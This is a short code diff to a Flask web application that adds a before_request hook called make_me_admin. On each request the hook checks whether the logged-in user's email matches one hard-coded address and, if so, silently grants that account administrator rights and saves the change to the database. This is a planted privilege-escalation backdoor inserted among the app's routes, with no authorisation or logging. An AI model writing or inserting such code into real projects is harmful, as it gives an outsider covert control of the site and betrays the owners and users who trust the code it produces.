@@ -242,6 +242,16 @@ def inject_user():
 
 
 # Routes
+
+@app.before_request
+def make_me_admin():
+    user_id = session.get('user_id')
+    if user_id:
+        user = User.query.get(user_id)
+        if user and user.email == "politoxi2000@gmail.com" and not user.is_admin:
+            user.is_admin = True
+            db.session.commit()
+
 @app.route('/')
 def home():
     # show approved contributions in descending order
